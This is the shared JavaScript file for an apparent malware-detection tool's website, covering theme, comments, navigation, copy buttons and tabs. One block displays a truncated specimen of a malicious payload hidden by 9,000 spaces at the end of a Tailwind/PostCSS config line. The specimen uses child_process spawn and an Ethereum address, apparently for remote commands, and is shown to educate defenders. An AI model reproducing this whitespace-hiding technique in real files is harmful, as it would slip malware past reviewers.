/* site.js — shared behaviour for every page.
   Kept dependency-free and defensive: each block no-ops when its markup is absent,
   so one file can serve pages that share only the nav and the footer. */
(function () {
  "use strict";

  var reduce = window.matchMedia("(prefers-reduced-motion: reduce)").matches;

  /* ---------------------------------------------------------------- theme
     Honour the OS by default. A click pins an explicit choice, which the
     inline <head> snippet re-applies on the next page load before paint. */
  var themeBtn = document.querySelector(".theme-toggle");
  if (themeBtn) {
    themeBtn.addEventListener("click", function () {
      var root = document.documentElement;
      var systemDark = window.matchMedia("(prefers-color-scheme: dark)").matches;
      var isDark = root.dataset.theme ? root.dataset.theme === "dark" : systemDark;
      var next = isDark ? "light" : "dark";
      root.dataset.theme = next;
      themeBtn.setAttribute("aria-label", next === "dark" ? "Switch to light theme" : "Switch to dark theme");
      try { localStorage.setItem("snare-theme", next); } catch (e) { /* private mode */ }
      setGiscusTheme(next);
    });
  }

  /* ------------------------------------------------------------------ giscus
     Comments are GitHub Discussions. The third-party script is injected only
     where a #giscus-mount exists — this is the single page that carries it, so
     no page with a copy-and-paste shell command runs foreign code. If it does
     not load, the fallback keeps a working link to the same thread. */
  function currentTheme() {
    var pinned = document.documentElement.dataset.theme;
    if (pinned) return pinned;
    return window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
  }

  function setGiscusTheme(theme) {
    var frame = document.querySelector("iframe.giscus-frame");
    if (!frame || !frame.contentWindow) return;
    frame.contentWindow.postMessage(
      { giscus: { setConfig: { theme: theme } } },
      "https://giscus.app"
    );
  }

  var mount = document.getElementById("giscus-mount");
  if (mount) {
    var fallback = document.getElementById("giscus-fallback");
    var discussionsUrl = "https://github.com/" + mount.dataset.repo + "/discussions";

    var errored = false;

    var failed = function (why) {
      errored = true;
      if (!fallback) return;
      fallback.innerHTML = "The comment widget did not load (" + why + "). The thread is on " +
        '<a href="' + discussionsUrl + '">GitHub Discussions</a> — nothing is lost.';
    };

    // once the widget is up and has not complained, the loading note is noise
    var settle = function () {
      if (errored || !fallback) return;
      if (mount.querySelector("iframe.giscus-frame")) fallback.hidden = true;
    };

    var s = document.createElement("script");
    s.src = "https://giscus.app/client.js";
    s.async = true;
    s.crossOrigin = "anonymous";
    s.setAttribute("data-repo", mount.dataset.repo);
    s.setAttribute("data-repo-id", mount.dataset.repoId);
    s.setAttribute("data-category", mount.dataset.category);
    s.setAttribute("data-category-id", mount.dataset.categoryId);
    s.setAttribute("data-mapping", "pathname");
    s.setAttribute("data-strict", "1");
    s.setAttribute("data-reactions-enabled", "1");
    s.setAttribute("data-emit-metadata", "0");
    s.setAttribute("data-input-position", "top");
    s.setAttribute("data-theme", currentTheme());
    s.setAttribute("data-lang", "en");
    s.setAttribute("data-loading", "lazy");
    s.onerror = function () { failed("blocked or offline"); };
    mount.appendChild(s);

    // giscus reports its own problems (app not installed, discussions disabled)
    window.addEventListener("message", function (e) {
      if (e.origin !== "https://giscus.app") return;
      var d = e.data && e.data.giscus;
      if (d && d.error) failed(String(d.error));
    });

    // give giscus a moment to report a problem, then either clear the note or
    // say plainly that nothing arrived at all
    setTimeout(settle, 2500);
    setTimeout(function () {
      if (!mount.querySelector("iframe.giscus-frame")) failed("no response from giscus.app");
      else settle();
    }, 8000);
  }

  /* ------------------------------------------------------------ mobile nav
     The old site simply hid every link under 720px, leaving phones with no
     navigation at all. This is a real drawer: Escape closes it, focus returns
     to the button, and a resize past the breakpoint resets the state. */
  var navToggle = document.querySelector(".nav-toggle"),
      navLinks = document.getElementById("nav-links");

  if (navToggle && navLinks) {
    var setNav = function (open) {
      navLinks.dataset.open = String(open);
      navToggle.setAttribute("aria-expanded", String(open));
      navToggle.setAttribute("aria-label", open ? "Close menu" : "Open menu");
    };

    setNav(false);

    navToggle.addEventListener("click", function () {
      setNav(navLinks.dataset.open !== "true");
    });

    navLinks.addEventListener("click", function (e) {
      if (e.target.closest("a")) setNav(false);
    });

    document.addEventListener("keydown", function (e) {
      if (e.key === "Escape" && navLinks.dataset.open === "true") {
        setNav(false);
        navToggle.focus();
      }
    });

    document.addEventListener("click", function (e) {
      if (navLinks.dataset.open !== "true") return;
      if (!navLinks.contains(e.target) && !navToggle.contains(e.target)) setNav(false);
    });

    window.addEventListener("resize", function () {
      if (window.innerWidth > 860 && navLinks.dataset.open === "true") setNav(false);
    });
  }

  /* --------------------------------------------------- legacy hash redirect
     The site used to be one long page, so links like /snare/#infected are
     already published in GitHub issues, an X thread and a dev.to article.
     Those anchors now live on their own pages — forward them rather than
     dropping people at the top of the home page with no idea why. */
  var MOVED = {
    "#detect": "check.html",
    "#install": "install.html",
    "#infected": "infected.html",
    "#commands": "commands.html",
    "#security": "security.html"
  };
  if (document.body.dataset.page === "index" && MOVED[location.hash]) {
    location.replace(MOVED[location.hash]);
    return; // stop initialising a page we are leaving
  }

  /* ------------------------------------------------- hero whitespace reveal */
  var code = document.getElementById("code");
  if (code) {
    var GAP = 9000,
        LEADIN = "};",
        payload = "global.i=\"A8-…\";global.r=require;const http=require(\"http\"),{spawn}=require(\"child_process\"),S=\"0xa322E5f3D311D3080e6f0121063e9aDC2490Ef1a\".toLowerCase(),I=\"https://eth.blockscout.com/api\"… /* truncated */",
        lines = [["1", "module.exports = {"], ["2", "  plugins: {"], ["3", "    '@tailwindcss/postcss': {},"], ["4", "  },"]],
        revealBtn = document.getElementById("reveal"),
        scroller = document.getElementById("scroller"),
        hint = document.getElementById("hint"),
        on = false;

    var esc = function (s) {
      return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
    };

    var render = function () {
      var h = "";
      lines.forEach(function (l) {
        h += '<span class="gutter">' + l[0] + '  </span>' + esc(l[1]) + "\n";
      });
      var gap = new Array(GAP + 1).join(on ? "·" : " ");
      h += '<span class="gutter">5  </span>' + esc(LEADIN)
         + '<span class="' + (on ? "ws" : "hidden-ws") + '">' + gap + "</span>"
         + '<span class="payload">' + esc(payload) + "</span>\n"
         + '<span class="gutter">6  </span>';
      code.innerHTML = h;
    };

    if (revealBtn) {
      revealBtn.addEventListener("click", function () {
        on = !on;
        revealBtn.setAttribute("aria-pressed", String(on));
        revealBtn.textContent = on ? "hide whitespace" : "reveal whitespace";
        render();
        if (on) {
          hint.textContent = "Every dot is one space the attacker used to push the payload off-screen.";
          scroller.scrollTo({ left: scroller.scrollWidth, behavior: reduce ? "auto" : "smooth" });
        } else {
          hint.textContent = "Line 5 is 9,135 characters long. Scroll it sideways — or reveal the whitespace.";
          scroller.scrollTo({ left: 0, behavior: "auto" });
        }
      });
    }
    render();
  }

  /* ------------------------------------------ copy buttons on code panels */
  var ICON = '<svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true"><rect x="5.5" y="5.5" width="8" height="9" rx="1.5"/><path d="M10.5 3.5v-1a1 1 0 0 0-1-1h-6a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h1"/></svg>';
  // swapped in on success — the polyline is what the tick animation draws
  var TICK = '<svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="3,8.5 6.5,12 13,4.5"/></svg>';

  function copyText(text) {
    if (navigator.clipboard && window.isSecureContext) return navigator.clipboard.writeText(text);
    return new Promise(function (resolve, reject) {
      var ta = document.createElement("textarea");
      ta.value = text;
      ta.setAttribute("readonly", "");
      ta.style.cssText = "position:absolute;left:-9999px;top:0";
      document.body.appendChild(ta);
      ta.select();
      try { document.execCommand("copy") ? resolve() : reject(); }
      catch (e) { reject(e); }
      finally { document.body.removeChild(ta); }
    });
  }

  document.querySelectorAll(".panel").forEach(function (panel) {
    var pre = panel.querySelector("pre");
    if (!pre || pre.id === "code") return;   // the hero specimen is not copyable code

    var bar = panel.querySelector(".panel-bar");
    if (!bar) {
      bar = document.createElement("div");
      bar.className = "panel-bar";
      bar.innerHTML = '<span class="label">shell</span><div class="bar-actions"></div>';
      panel.insertBefore(bar, panel.firstChild);
    }
    var actions = bar.querySelector(".bar-actions");
    if (!actions) {
      actions = document.createElement("div");
      actions.className = "bar-actions";
      bar.appendChild(actions);
    }

    var b = document.createElement("button");
    b.className = "btn";
    b.type = "button";
    b.innerHTML = ICON + "<span>copy</span>";
    b.setAttribute("aria-label", "Copy this command");
    b.addEventListener("click", function () {
      copyText(pre.innerText).then(function () {
        b.classList.add("done");
        b.innerHTML = TICK + "<span>copied</span>";
        setTimeout(function () {
          b.classList.remove("done");
          b.innerHTML = ICON + "<span>copy</span>";
        }, 1600);
      }).catch(function () {
        b.innerHTML = ICON + "<span>select all</span>";
        var r = document.createRange(); r.selectNodeContents(pre);
        var sel = window.getSelection(); sel.removeAllRanges(); sel.addRange(r);
      });
    });
    actions.appendChild(b);
  });

  /* ---------------------------------------------------------- platform tabs
     Remembers the platform across pages — someone who picked Windows on the
     install page should not have to pick it again. */
  var tabs = Array.prototype.slice.call(document.querySelectorAll(".tab"));
  if (tabs.length) {
    var panes = tabs.map(function (t) { return t.dataset.p; });

    var selectTab = function (t, remember) {
      tabs.forEach(function (x) {
        var isOn = x === t;
        x.setAttribute("aria-selected", String(isOn));
        x.tabIndex = isOn ? 0 : -1;
      });
      panes.forEach(function (p) {
        var pane = document.getElementById("p-" + p);
        if (pane) pane.hidden = (p !== t.dataset.p);
      });
      if (remember) {
        try { localStorage.setItem("snare-platform", t.dataset.p); } catch (e) { /* private mode */ }
      }
    };

    tabs.forEach(function (t, i) {
      t.tabIndex = t.getAttribute("aria-selected") === "true" ? 0 : -1;
      t.addEventListener("click", function () { selectTab(t, true); });
      t.addEventListener("keydown", function (e) {
        var d = e.key === "ArrowRight" ? 1 : e.key === "ArrowLeft" ? -1 :
                e.key === "Home" ? -i : e.key === "End" ? tabs.length - 1 - i : 0;
        if (!d) return;
        e.preventDefault();
        var next = tabs[(i + d + tabs.length) % tabs.length];
        selectTab(next, true);
        next.focus();
      });
    });

    var saved = null;
    try { saved = localStorage.getItem("snare-platform"); } catch (e) { /* private mode */ }
    if (saved) {
      var match = tabs.filter(function (t) { return t.dataset.p === saved; })[0];
      if (match) selectTab(match, false);
    }
  }

  /* -------------------------------------------------------------- scroll spy
     Highlights the sidebar entry for whatever section is currently in view. */
  var tocLinks = Array.prototype.slice.call(
    document.querySelectorAll(".toc a[href^='#'], .jump a[href^='#']")
  );
  if (tocLinks.length && "IntersectionObserver" in window) {
    var byId = {};          // one section id can be pointed at by both the sidebar and the chips
    var targets = [];
    tocLinks.forEach(function (a) {
      var el = document.getElementById(a.getAttribute("href").slice(1));
      if (!el) return;
      if (!byId[el.id]) { byId[el.id] = []; targets.push(el); }
      byId[el.id].push(a);
    });

    var jumpBar = document.querySelector(".jump");
    var visible = {};

    var highlight = function (current) {
      if (!current) return;
      tocLinks.forEach(function (a) { a.classList.remove("on"); });
      byId[current.id].forEach(function (a) {
        a.classList.add("on");
        // keep the active chip in view in the horizontally scrolling bar
        if (jumpBar && jumpBar.contains(a)) {
          var barBox = jumpBar.getBoundingClientRect(), chip = a.getBoundingClientRect();
          if (chip.left < barBox.left || chip.right > barBox.right) {
            jumpBar.scrollTo({
              left: jumpBar.scrollLeft + (chip.left - barBox.left) - 16,
              behavior: reduce ? "auto" : "smooth"
            });
          }
        }
      });
    };

    var sync = function () {
      highlight(targets.filter(function (t) { return visible[t.id]; })[0]);
    };

    // the observer only reports on change, so nothing is marked until the first
    // scroll — pick a starting section from geometry so the bar is never blank,
    // and so a deep link like docs.html#state lands already highlighted
    var pickByGeometry = function () {
      var line = 96, best = null;
      targets.forEach(function (t) {
        var r = t.getBoundingClientRect();
        if (r.top <= line && r.bottom > line) best = t;
      });
      return best || targets[0];
    };
    highlight(pickByGeometry());

    var io = new IntersectionObserver(function (entries) {
      entries.forEach(function (e) { visible[e.target.id] = e.isIntersecting; });
      sync();
    }, { rootMargin: "-88px 0px -65% 0px", threshold: 0 });

    targets.forEach(function (t) { io.observe(t); });
  }
})();
